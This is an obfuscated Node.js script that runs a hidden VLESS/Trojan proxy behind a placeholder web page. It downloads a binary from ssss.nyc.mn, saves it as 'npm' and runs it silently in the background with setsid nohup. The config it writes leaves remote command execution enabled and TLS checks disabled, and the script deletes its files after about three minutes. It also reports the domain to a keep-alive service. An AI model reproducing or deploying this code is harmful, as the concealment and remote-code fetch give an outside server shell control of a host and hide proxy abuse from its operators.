function _0x3175(){const _0x12560d=['writeHead','map','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','crypto',':443?encryption=none&security=tls&sni=','every','https://oooo.serv00.net/add-url','get','2083','text/plain','connection','substr','error','Unknown','path','log','replace','7LdUbJH','child_process','message','data','once','419622syAHwr','pop','index.html','writeFileSync','&path=%2F','application/json','listen','npm\x20running\x20error:','concat','utf8','pipe','1272LzajNa','axios','2586483FtzDpM','https://arm64.ssss.nyc.mn/v1','then','trim','https://api.ip.sb/geoip','net','decode','1hYyzuO','2087','1653045wdFKVr','8443','includes','digest','write','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','arm','client_secret:\x20','readUInt16BE','post','npm\x20download\x20successfully','createWriteStream','\x20with\x20all\x20DNS\x20servers','1486312lHhviD','148200WknqzV','setsid\x20nohup\x20./npm\x20-s\x20','find','npm\x20is\x20already\x20running,\x20skip\x20running...','sub','length','https://','readUInt8','error:\x20','Not\x20Found\x0a','config.yaml','\x20-p\x20','end','close','/bin/bash','2656jAvpVi','arch','createHash','finish','sha224','http','text/html','Server','slice','npm','url','readFile','Failed\x20to\x20resolve\x20','join','Answer','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','unlink','connect','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','443','1234.abc.com','&type=A','split','catch','https://amd64.ssss.nyc.mn/agent','Automatic\x20Access\x20Task\x20added\x20successfully','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','chmod\x20+x\x20npm','true','2053','4494oZrwZw','2096','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','&fp=chrome&type=ws&host=','--tls','stream','toString','trojan://','npm\x20is\x20running'];_0x3175=function(){return _0x12560d;};return _0x3175();}const _0x2acba5=_0x2e92;(function(_0x30dac6,_0x3dfa5f){const _0x1ce7e8=_0x2e92,_0x3e3fae=_0x30dac6();while(!![]){try{const _0x23f2ed=-parseInt(_0x1ce7e8(0x20b))/0x1*(parseInt(_0x1ce7e8(0x1d8))/0x2)+-parseInt(_0x1ce7e8(0x202))/0x3*(-parseInt(_0x1ce7e8(0x1ba))/0x4)+parseInt(_0x1ce7e8(0x20d))/0x5+parseInt(_0x1ce7e8(0x1f7))/0x6*(parseInt(_0x1ce7e8(0x1f2))/0x7)+-parseInt(_0x1ce7e8(0x1aa))/0x8+-parseInt(_0x1ce7e8(0x204))/0x9+-parseInt(_0x1ce7e8(0x1ab))/0xa;if(_0x23f2ed===_0x3dfa5f)break;else _0x3e3fae['push'](_0x3e3fae['shift']());}catch(_0x123e70){_0x3e3fae['push'](_0x3e3fae['shift']());}}}(_0x3175,0x2ed5f));const os=require('os'),http=require(_0x2acba5(0x1bf)),fs=require('fs'),axios=require(_0x2acba5(0x203)),net=require(_0x2acba5(0x209)),path=require(_0x2acba5(0x1ef)),crypto=require(_0x2acba5(0x1e4)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x2acba5(0x1f3)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process.env.UUID||'5efabea4-f6aa-91bb-b8f0-17e004c89c60',NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',DOMAIN=process.env.DOMAIN||_0x2acba5(0x1ce),AUTO_ACCESS=process.env.AUTO_ACCESS||!![],WSPATH=process.env.WSPATH||UUID[_0x2acba5(0x1c2)](0x0,0x8),SUB_PATH=process.env.SUB_PATH||_0x2acba5(0x1af),NAME=process.env.NAME||'',PORT=process.env.PORT||0x1eb4;function _0x2e92(_0x53af3b,_0x4ccad8){_0x53af3b=_0x53af3b-0x1a8;const _0x317572=_0x3175();let _0x2e92b1=_0x317572[_0x53af3b];return _0x2e92b1;}let ISP='';const GetISP=async()=>{const _0x41f44d=_0x2acba5;try{const _0x355431=await axios[_0x41f44d(0x1e8)](_0x41f44d(0x208)),_0x3a6a7e=_0x355431[_0x41f44d(0x1f5)];ISP=(_0x3a6a7e['country_code']+'-'+_0x3a6a7e['isp'])['replace'](/ /g,'_');}catch(_0x581717){ISP=_0x41f44d(0x1ee);}};GetISP();const httpServer=http['createServer']((_0x4e7c45,_0x32acf6)=>{const _0x1ad9ad=_0x2acba5;if(_0x4e7c45['url']==='/'){const _0x122150=path[_0x1ad9ad(0x1c7)](__dirname,_0x1ad9ad(0x1f9));fs[_0x1ad9ad(0x1c5)](_0x122150,_0x1ad9ad(0x200),(_0x36c781,_0x188110)=>{const _0x48f0aa=_0x1ad9ad;if(_0x36c781){_0x32acf6[_0x48f0aa(0x1e1)](0xc8,{'Content-Type':_0x48f0aa(0x1c0)}),_0x32acf6['end']('Hello\x20world!');return;}_0x32acf6[_0x48f0aa(0x1e1)](0xc8,{'Content-Type':_0x48f0aa(0x1c0)}),_0x32acf6[_0x48f0aa(0x1b7)](_0x188110);});return;}else{if(_0x4e7c45[_0x1ad9ad(0x1c4)]==='/'+SUB_PATH){const _0x432fc7=NAME?NAME+'-'+ISP:ISP,_0x3020b4='vless://'+UUID+'@'+DOMAIN+_0x1ad9ad(0x1e5)+DOMAIN+_0x1ad9ad(0x1db)+DOMAIN+_0x1ad9ad(0x1fb)+WSPATH+'#'+_0x432fc7,_0x54685d=_0x1ad9ad(0x1df)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x1ad9ad(0x1db)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x432fc7,_0x15accf=_0x3020b4+'\x0a'+_0x54685d,_0x18a693=Buffer['from'](_0x15accf)[_0x1ad9ad(0x1de)]('base64');_0x32acf6[_0x1ad9ad(0x1e1)](0xc8,{'Content-Type':_0x1ad9ad(0x1ea)}),_0x32acf6[_0x1ad9ad(0x1b7)](_0x18a693+'\x0a');}else _0x32acf6[_0x1ad9ad(0x1e1)](0x194,{'Content-Type':_0x1ad9ad(0x1ea)}),_0x32acf6[_0x1ad9ad(0x1b7)](_0x1ad9ad(0x1b4));}}),wss=new WebSocket[(_0x2acba5(0x1c1))]({'server':httpServer}),uuid=UUID[_0x2acba5(0x1f1)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x2aa73c){return new Promise((_0x2c4309,_0x10aff4)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x2aa73c)){_0x2c4309(_0x2aa73c);return;}let _0x797e61=0x0;function _0x395e24(){const _0x29f9a2=_0x2e92;if(_0x797e61>=DNS_SERVERS[_0x29f9a2(0x1b0)]){_0x10aff4(new Error(_0x29f9a2(0x1c6)+_0x2aa73c+_0x29f9a2(0x1a9)));return;}const _0x2be979=DNS_SERVERS[_0x797e61];_0x797e61++;const _0x4a26bb='https://dns.google/resolve?name='+encodeURIComponent(_0x2aa73c)+_0x29f9a2(0x1cf);axios[_0x29f9a2(0x1e8)](_0x4a26bb,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x29f9a2(0x206)](_0x3b2c92=>{const _0x5ae1b2=_0x29f9a2,_0x116dd3=_0x3b2c92['data'];if(_0x116dd3['Status']===0x0&&_0x116dd3[_0x5ae1b2(0x1c8)]&&_0x116dd3[_0x5ae1b2(0x1c8)][_0x5ae1b2(0x1b0)]>0x0){const _0x26b6cd=_0x116dd3[_0x5ae1b2(0x1c8)][_0x5ae1b2(0x1ad)](_0x1c2b1c=>_0x1c2b1c['type']===0x1);if(_0x26b6cd){_0x2c4309(_0x26b6cd['data']);return;}}_0x395e24();})[_0x29f9a2(0x1d1)](_0x5bb7e7=>{_0x395e24();});}_0x395e24();});}function handleVlessConnection(_0x42ef24,_0xf1fc51){const _0xd5a3b8=_0x2acba5,[_0x4972d0]=_0xf1fc51,_0x94f3ae=_0xf1fc51[_0xd5a3b8(0x1c2)](0x1,0x11);if(!_0x94f3ae['every']((_0x26396d,_0x295be2)=>_0x26396d==parseInt(uuid[_0xd5a3b8(0x1ec)](_0x295be2*0x2,0x2),0x10)))return![];let _0x4219ed=_0xf1fc51[_0xd5a3b8(0x1c2)](0x11,0x12)['readUInt8']()+0x13;const _0x498dfc=_0xf1fc51[_0xd5a3b8(0x1c2)](_0x4219ed,_0x4219ed+=0x2)[_0xd5a3b8(0x215)](0x0),_0x3d6f94=_0xf1fc51['slice'](_0x4219ed,_0x4219ed+=0x1)[_0xd5a3b8(0x1b2)](),_0x5a1ada=_0x3d6f94==0x1?_0xf1fc51[_0xd5a3b8(0x1c2)](_0x4219ed,_0x4219ed+=0x4)[_0xd5a3b8(0x1c7)]('.'):_0x3d6f94==0x2?new TextDecoder()[_0xd5a3b8(0x20a)](_0xf1fc51[_0xd5a3b8(0x1c2)](_0x4219ed+0x1,_0x4219ed+=0x1+_0xf1fc51[_0xd5a3b8(0x1c2)](_0x4219ed,_0x4219ed+0x1)[_0xd5a3b8(0x1b2)]())):_0x3d6f94==0x3?_0xf1fc51[_0xd5a3b8(0x1c2)](_0x4219ed,_0x4219ed+=0x10)['reduce']((_0x1adf25,_0x3eebe6,_0x4d296f,_0x274e42)=>_0x4d296f%0x2?_0x1adf25[_0xd5a3b8(0x1ff)](_0x274e42[_0xd5a3b8(0x1c2)](_0x4d296f-0x1,_0x4d296f+0x1)):_0x1adf25,[])[_0xd5a3b8(0x1e2)](_0x4d46ae=>_0x4d46ae[_0xd5a3b8(0x215)](0x0)[_0xd5a3b8(0x1de)](0x10))[_0xd5a3b8(0x1c7)](':'):'';_0x42ef24['send'](new Uint8Array([_0x4972d0,0x0]));const _0x47b788=createWebSocketStream(_0x42ef24);return resolveHost(_0x5a1ada)[_0xd5a3b8(0x206)](_0x4f86be=>{const _0x37663c=_0xd5a3b8;net[_0x37663c(0x1cb)]({'host':_0x4f86be,'port':_0x498dfc},function(){const _0x26f562=_0x37663c;this[_0x26f562(0x211)](_0xf1fc51[_0x26f562(0x1c2)](_0x4219ed)),_0x47b788['on'](_0x26f562(0x1ed),()=>{})[_0x26f562(0x201)](this)['on']('error',()=>{})[_0x26f562(0x201)](_0x47b788);})['on'](_0x37663c(0x1ed),()=>{});})[_0xd5a3b8(0x1d1)](_0x1e3648=>{const _0x124150=_0xd5a3b8;net[_0x124150(0x1cb)]({'host':_0x5a1ada,'port':_0x498dfc},function(){const _0xed97e=_0x124150;this[_0xed97e(0x211)](_0xf1fc51['slice'](_0x4219ed)),_0x47b788['on'](_0xed97e(0x1ed),()=>{})[_0xed97e(0x201)](this)['on'](_0xed97e(0x1ed),()=>{})[_0xed97e(0x201)](_0x47b788);})['on'](_0x124150(0x1ed),()=>{});}),!![];}function handleTrojanConnection(_0x300259,_0x47b861){const _0x58acf3=_0x2acba5;try{if(_0x47b861[_0x58acf3(0x1b0)]<0x3a)return![];const _0xc5b48c=_0x47b861[_0x58acf3(0x1c2)](0x0,0x38)[_0x58acf3(0x1de)](),_0x53fc6c=[UUID];let _0x171d8f=null;for(const _0x289764 of _0x53fc6c){const _0x2ab81c=crypto[_0x58acf3(0x1bc)](_0x58acf3(0x1be))['update'](_0x289764)[_0x58acf3(0x210)]('hex');if(_0x2ab81c===_0xc5b48c){_0x171d8f=_0x289764;break;}}if(!_0x171d8f)return![];let _0x322a7e=0x38;_0x47b861[_0x322a7e]===0xd&&_0x47b861[_0x322a7e+0x1]===0xa&&(_0x322a7e+=0x2);const _0x1d2052=_0x47b861[_0x322a7e];if(_0x1d2052!==0x1)return![];_0x322a7e+=0x1;const _0x285ba1=_0x47b861[_0x322a7e];_0x322a7e+=0x1;let _0x58dbbd,_0x1c5974;if(_0x285ba1===0x1)_0x58dbbd=_0x47b861[_0x58acf3(0x1c2)](_0x322a7e,_0x322a7e+0x4)[_0x58acf3(0x1c7)]('.'),_0x322a7e+=0x4;else{if(_0x285ba1===0x3){const _0x48514d=_0x47b861[_0x322a7e];_0x322a7e+=0x1,_0x58dbbd=_0x47b861[_0x58acf3(0x1c2)](_0x322a7e,_0x322a7e+_0x48514d)['toString'](),_0x322a7e+=_0x48514d;}else{if(_0x285ba1===0x4)_0x58dbbd=_0x47b861[_0x58acf3(0x1c2)](_0x322a7e,_0x322a7e+0x10)['reduce']((_0x52a189,_0x517bd8,_0x33b91e,_0x2a8c21)=>_0x33b91e%0x2?_0x52a189['concat'](_0x2a8c21[_0x58acf3(0x1c2)](_0x33b91e-0x1,_0x33b91e+0x1)):_0x52a189,[])[_0x58acf3(0x1e2)](_0x1723bd=>_0x1723bd[_0x58acf3(0x215)](0x0)['toString'](0x10))[_0x58acf3(0x1c7)](':'),_0x322a7e+=0x10;else return![];}}_0x1c5974=_0x47b861[_0x58acf3(0x215)](_0x322a7e),_0x322a7e+=0x2;_0x322a7e<_0x47b861['length']&&_0x47b861[_0x322a7e]===0xd&&_0x47b861[_0x322a7e+0x1]===0xa&&(_0x322a7e+=0x2);const _0x2ff63b=createWebSocketStream(_0x300259);return resolveHost(_0x58dbbd)[_0x58acf3(0x206)](_0x4c3857=>{const _0x3abd05=_0x58acf3;net[_0x3abd05(0x1cb)]({'host':_0x4c3857,'port':_0x1c5974},function(){const _0x49eef3=_0x3abd05;_0x322a7e<_0x47b861[_0x49eef3(0x1b0)]&&this[_0x49eef3(0x211)](_0x47b861[_0x49eef3(0x1c2)](_0x322a7e)),_0x2ff63b['on'](_0x49eef3(0x1ed),()=>{})[_0x49eef3(0x201)](this)['on'](_0x49eef3(0x1ed),()=>{})['pipe'](_0x2ff63b);})['on']('error',()=>{});})[_0x58acf3(0x1d1)](_0x3478e5=>{const _0xe680ec=_0x58acf3;net[_0xe680ec(0x1cb)]({'host':_0x58dbbd,'port':_0x1c5974},function(){const _0x3f8fc2=_0xe680ec;_0x322a7e<_0x47b861[_0x3f8fc2(0x1b0)]&&this[_0x3f8fc2(0x211)](_0x47b861['slice'](_0x322a7e)),_0x2ff63b['on'](_0x3f8fc2(0x1ed),()=>{})[_0x3f8fc2(0x201)](this)['on']('error',()=>{})[_0x3f8fc2(0x201)](_0x2ff63b);})['on'](_0xe680ec(0x1ed),()=>{});}),!![];}catch(_0x174a5f){return![];}}wss['on'](_0x2acba5(0x1eb),(_0x243afc,_0x3be3cd)=>{const _0x29cbea=_0x2acba5,_0x8aa955=_0x3be3cd[_0x29cbea(0x1c4)]||'';_0x243afc[_0x29cbea(0x1f6)](_0x29cbea(0x1f4),_0x30be5e=>{const _0x3d1637=_0x29cbea;if(_0x30be5e[_0x3d1637(0x1b0)]>0x11&&_0x30be5e[0x0]===0x0){const _0xa0c428=_0x30be5e[_0x3d1637(0x1c2)](0x1,0x11),_0x5a5ce6=_0xa0c428[_0x3d1637(0x1e6)]((_0x11077a,_0x26a278)=>_0x11077a==parseInt(uuid[_0x3d1637(0x1ec)](_0x26a278*0x2,0x2),0x10));if(_0x5a5ce6){!handleVlessConnection(_0x243afc,_0x30be5e)&&_0x243afc[_0x3d1637(0x1b8)]();return;}}!handleTrojanConnection(_0x243afc,_0x30be5e)&&_0x243afc['close']();})['on'](_0x29cbea(0x1ed),()=>{});});const getDownloadUrl=()=>{const _0x5b2622=_0x2acba5,_0x1ae657=os[_0x5b2622(0x1bb)]();return _0x1ae657===_0x5b2622(0x213)||_0x1ae657==='arm64'||_0x1ae657==='aarch64'?!NEZHA_PORT?_0x5b2622(0x205):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x5b2622(0x1d2);},downloadFile=async()=>{const _0x2f8109=_0x2acba5;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x640dc1=getDownloadUrl(),_0x15ad5c=await axios({'method':_0x2f8109(0x1e8),'url':_0x640dc1,'responseType':_0x2f8109(0x1dd)}),_0x152c3c=fs[_0x2f8109(0x1a8)]('npm');return _0x15ad5c[_0x2f8109(0x1f5)][_0x2f8109(0x201)](_0x152c3c),new Promise((_0x220152,_0x52a2eb)=>{const _0x59f5b8=_0x2f8109;_0x152c3c['on'](_0x59f5b8(0x1bd),()=>{const _0x4394dd=_0x59f5b8;console[_0x4394dd(0x1f0)](_0x4394dd(0x217)),exec(_0x4394dd(0x1d5),_0x2bd89e=>{if(_0x2bd89e)_0x52a2eb(_0x2bd89e);_0x220152();});}),_0x152c3c['on'](_0x59f5b8(0x1ed),_0x52a2eb);});}catch(_0x4d413b){throw _0x4d413b;}},runnz=async()=>{const _0xfb2632=_0x2acba5;try{const _0x4d03bc=execSync(_0xfb2632(0x1cc),{'encoding':'utf-8'});if(_0x4d03bc[_0xfb2632(0x207)]()!==''){console[_0xfb2632(0x1f0)](_0xfb2632(0x1ae));return;}}catch(_0x203ea0){}await downloadFile();let _0x1ab556='',_0x373bcc=[_0xfb2632(0x1cd),_0xfb2632(0x20e),_0xfb2632(0x1d9),_0xfb2632(0x20c),_0xfb2632(0x1e9),_0xfb2632(0x1d7)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x17f6ce=_0x373bcc[_0xfb2632(0x20f)](NEZHA_PORT)?_0xfb2632(0x1dc):'';_0x1ab556=_0xfb2632(0x1ac)+NEZHA_SERVER+':'+NEZHA_PORT+_0xfb2632(0x1b6)+NEZHA_KEY+'\x20'+_0x17f6ce+_0xfb2632(0x212);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x35b9bf=NEZHA_SERVER[_0xfb2632(0x20f)](':')?NEZHA_SERVER[_0xfb2632(0x1d0)](':')[_0xfb2632(0x1f8)]():'',_0xa6958f=_0x373bcc['includes'](_0x35b9bf)?_0xfb2632(0x1d6):'false',_0x30e2cb=_0xfb2632(0x214)+NEZHA_KEY+_0xfb2632(0x1e3)+NEZHA_SERVER+_0xfb2632(0x1c9)+_0xa6958f+_0xfb2632(0x1da)+UUID;fs[_0xfb2632(0x1fa)](_0xfb2632(0x1b5),_0x30e2cb);}_0x1ab556='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0xfb2632(0x1f0)](_0xfb2632(0x1d4));return;}}try{exec(_0x1ab556,{'shell':_0xfb2632(0x1b9)},_0x5e22e9=>{const _0x16d234=_0xfb2632;if(_0x5e22e9)console['error'](_0x16d234(0x1fe),_0x5e22e9);else console[_0x16d234(0x1f0)](_0x16d234(0x1e0));});}catch(_0x21967c){console[_0xfb2632(0x1ed)](_0xfb2632(0x1b3)+_0x21967c);}};async function addAccessTask(){const _0x3a7157=_0x2acba5;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x325c86=_0x3a7157(0x1b1)+DOMAIN;try{const _0x131cc3=await axios[_0x3a7157(0x216)](_0x3a7157(0x1e7),{'url':_0x325c86},{'headers':{'Content-Type':_0x3a7157(0x1fc)}});console[_0x3a7157(0x1f0)](_0x3a7157(0x1d3));}catch(_0x21acb5){}}const delFiles=()=>{const _0x357895=_0x2acba5;fs[_0x357895(0x1ca)](_0x357895(0x1c3),()=>{}),fs[_0x357895(0x1ca)]('config.yaml',()=>{});};httpServer[_0x2acba5(0x1fd)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
